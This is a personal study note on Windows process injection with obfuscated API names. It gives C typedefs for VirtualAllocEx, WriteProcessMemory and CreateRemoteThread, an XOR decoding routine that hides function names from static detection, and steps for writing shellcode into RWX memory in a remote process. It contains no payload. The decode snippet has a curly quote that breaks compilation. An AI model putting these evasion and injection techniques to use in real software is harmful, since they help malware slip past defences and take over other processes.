---
publish: true
title: Classic Code Injection With API Obfuscation
created: 2025-09-04T19:07:02.265+05:30
tags:
  - CreateToolhelp32Snapshot
  - OpenProcess
  - VirtualAllocEx
  - WriteProcessMemory
  - CreateRemoteThread
  - Deobfuscation
---

## Observation

- Same as [[classic-code-injection-remote-process]], but we also employ API call obfuscation.
- typedefs were created for the obfuscated functions, which will be used to cast the return of `GetProcAddress` for those functions.
- The obfuscated function names are stored as raw bytes in an unsigned char array.

## Obfuscation

- typedefs of the following Windows API functions were created: `VirtualAllocEx`,`WriteProcessMemory`, and `CreateRemoteThread`.

```C
typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, 
LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);
```

- A xor function to de-obfuscate the function names with a key. These are its arguments:
  - data: Pointer to the data that needs to be decoded (function name)
  - data\_len: Length of the data.
  - key: Key used for XOR operations (the names were encoded with this key)
  - key\_len: Length of the key.

Functions used for de-obfuscating the function names:

```c
void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) 
{
	int j = 0;
	for (size_t i = 0; i < data_len; i++) {
		if (j == key_len) j = 0;
		    data[i] = data[i] ^ key[j];
	    j++;
	}
}
```

```c
LPCSTR DAndP(unsigned char* encoded, size_t len, const char* key, size_t key_len) 
{ 
	char* decoded = new char[len + 1]; 
	memcpy(decoded, encoded, len); 
	XOR(reinterpret_cast<unsigned char*>(decoded), len, key, key_len); decoded[len] = ‘\0’; 
	return decoded;
}
```

## Working

- Identify a target process using `CreateToolhelp32Snapshot` to enumerate running processes and identify the target process by its name.
- Once identified, get a handle to the target process using `OpenProcess` (`PROCESS_ALL_ACCESS` is a desired access right).
- Allocate Memory  in the target process' address space using `VirtualAllocEx`, with `RWX` permissions. (after de-obfuscation)
- Copy shellcode to the allocated buffer using `WriteProcessMemory`. (after de-obfuscation)
- Create a remote thread using `CreateRemoteThread` that starts at the address of our shellcode. (after de-obfuscation)
